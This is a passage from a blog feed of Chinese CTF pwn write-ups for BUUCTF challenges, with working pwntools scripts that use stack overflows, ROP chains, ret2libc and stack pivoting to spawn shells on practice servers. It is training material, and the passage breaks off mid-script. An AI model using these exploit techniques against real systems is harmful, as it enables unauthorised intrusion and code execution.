win1，然后调用 win2，win2 返回地址为 flag 函数，后接参数。其次再接 flag 函数的参数。</p>\n<p><img data-src=\"./image-20230831022138358.png\" alt=\"image-20230831022138358\"></p>\n<p>传参值均从汇编中获取。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28095</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./PicoCTF_2018_rop_chain')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>win1 <span class=\"token operator\">=</span> <span class=\"token number\">0x080485CB</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token number\">0x0BAAAAAAD</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>win2 <span class=\"token operator\">=</span> <span class=\"token number\">0x080485D8</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>a2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0DEADBAAD</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x0804862B</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span>  <span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>win1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>win2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ez_pz_hackover_2016\"><a class=\"markdownIt-Anchor\" href=\"#ez_pz_hackover_2016\">#</a> ez_pz_hackover_2016</h2>\n<h3 id=\"memchr\"><a class=\"markdownIt-Anchor\" href=\"#memchr\">#</a> memchr</h3>\n<p>C 库函数 <strong>void *memchr(const void *str, int c, size_t n)</strong> 在参数 <strong>str</strong> 所指向的字符串的前 <strong>n</strong> 个字节中搜索第一次出现字符 <strong>c</strong>（一个无符号字符）的位置。</p>\n<h4 id=\"参数\"><a class=\"markdownIt-Anchor\" href=\"#参数\">#</a> 参数</h4>\n<ul>\n<li><strong>str</strong> – 指向要执行搜索的内存块。</li>\n<li><strong>c</strong> – 以 int 形式传递的值，但是函数在每次字节搜索时是使用该值的无符号字符形式。</li>\n<li><strong>n</strong> – 要被分析的字节数。</li>\n</ul>\n<h4 id=\"返回值\"><a class=\"markdownIt-Anchor\" href=\"#返回值\">#</a> 返回值</h4>\n<p>该函数返回一个指向匹配字节的指针，如果在给定的内存区域未出现字符，则返回 NULL。</p>\n<h2 id=\"wustctf2020_getshell\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_getshell\">#</a> wustctf2020_getshell</h2>\n<h2 id=\"jarvisoj_level3_x64\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_level3_x64\">#</a> jarvisoj_level3_x64</h2>\n<h2 id=\"bjdctf_2020_babyrop2\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_babyrop2\">#</a> bjdctf_2020_babyrop2</h2>\n<h2 id=\"jarvisoj_level4\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_level4\">#</a> jarvisoj_level4</h2>\n<h2 id=\"pwnable_orw\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_orw\">#</a> pwnable_orw</h2>\n<h2 id=\"mrctf2020_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_shellcode\">#</a> mrctf2020_shellcode</h2>\n<h2 id=\"bjdctf_2020_router\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_router\">#</a> bjdctf_2020_router</h2>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/08/buu-0824/",
            "url": "http://waltcsz.github.io/2023/08/buu-0824/",
            "title": "buu 0824",
            "date_published": "2023-08-26T10:49:26.000Z",
            "content_html": "<h2 id=\"other_shellcode-1\"><a class=\"markdownIt-Anchor\" href=\"#other_shellcode-1\">#</a> other_shellcode 1</h2>\n<p>这题直连就是 getshell，大概就是介绍一下系统调用这玩意</p>\n<p><img data-src=\"./image-20230826184740060.png\" alt=\"image-20230826184740060\" style=\"zoom:25%;\" /><img data-src=\"./image-20230826184800160.png\" alt=\"image-20230826184800160\"></p>\n<h2 id=\"not_the_same_3dsctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#not_the_same_3dsctf_2016\">#</a> not_the_same_3dsctf_2016</h2>\n<p>主函数即给了 gets 用于栈溢出，先利用后门函数 get_secret () 将 flag 写入内存，之后用 write 函数输出 flag。</p>\n<p>代码如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./not_the_same_3dsctf_2016')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node4.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">29076</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./not_the_same_3dsctf_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>write_plt <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x080489A0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x080ECA2D</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main_addr <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x2D</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_ne_5\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_ne_5\">#</a> *ciscn_2019_ne_5</h2>\n<p>经典菜单程序。getflag 函数中，strcpy (dest, src) 将 src 复制给 dest，此时可以造成溢出。</p>\n<p>在 AddLog 中输入 payload，之后进入 GetFlag 即可实现栈溢出。</p>\n<p>利用 system 函数和 sh 字符串 getshell。</p>\n<p>32 位下 ret2libc 时，若选用的汇编命令为 call system 时，构造 payload 时 system 地址和参数地址之间的返回地址可省略。因为调用 call 指令时会将当前命令地址压入栈中，相当于正常流程中入栈返回地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./ciscn_2019_ne_5')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28585</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>call_sys <span class=\"token operator\">=</span> <span class=\"token number\">0x080486B9</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x080484D0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token operator\">=</span> <span class=\"token number\">0x080482ea</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x8048722</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x48</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>call_sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#该行为使用 call system</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#payload = b'a'*offset + p32(sys) +b'aaaa'+ p32(sh)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#该行为使用 system 的真实地址</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'administrator'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'info:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Exit\\n:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"2018_rop\"><a class=\"markdownIt-Anchor\" href=\"#2018_rop\">#</a> 2018_rop</h2>\n<p>ret2libc3</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29613</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./2018_rop')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./2018_rop'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>write<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>main_a<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x088</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lsm_a<span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_es_2\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_2\">#</a> ciscn_2019_es_2</h2>\n<p>这题利用栈迁移。因为栈溢出刚好只能溢出到返回地址，完全不够 payload。</p>\n<p>有两次 read 机会。第一次泄露 ebp 地址，第二次将旧 ebp 修改为字符串起始位置 - 4，返回地址设置为 leave ret 指令的地址，在 main 函数结束时两次 leave ret 即可将栈顶设置为字符串起始。</p>\n<p><img data-src=\"./image-20230826212018947.png\" alt=\"image-20230826212018947\"></p>\n<p><img data-src=\"./image-20230826213000984.png\" alt=\"image-20230826213000984\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./ciscn_2019_es_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25878</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>call_puts <span class=\"token operator\">=</span> <span class=\"token number\">0x0804861D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x08048559</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x080486C0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>hack <span class=\"token operator\">=</span><span class=\"token number\">0x0804854B</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x28</span> <span class=\"token comment\">#before ebp</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x080484b8</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>offset<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ebp <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>new_ebp <span class=\"token operator\">=</span> ebp <span class=\"token operator\">-</span> <span class=\"token number\">0xffffcf98</span> <span class=\"token operator\">+</span> <span class=\"token number\">0xffffcf60</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>new_ebp<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/\\sh\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>new_ebp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"harekazectf2019baby_rop2\"><a class=\"markdownIt-Anchor\" href=\"#harekazectf2019baby_rop2\">#</a> [HarekazeCTF2019]baby_rop2</h2>\n<p>ret2libc</p>\n<p>没有 puts 函数只能用 printf 函数，这时需要一个程序自带的，含有 % s 的字符串。</p>\n<p>这题比较恶心的是 flag 没放在根目录，利用 find -name “flag&quot; 查找文件位置。</p>\n<p><img data-src=\"./image-20230827010409448.png\" alt=\"image-20230827010409448\"></p>\n<p><img data-src=\"./image-20230827010446306.png\" alt=\"image-20230827010446306\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29945</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./babyrop2')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./babyrop2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>exit_a <span class=\"token operator\">=</span> main_a</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0400733</span></pre></td></tr><tr><td 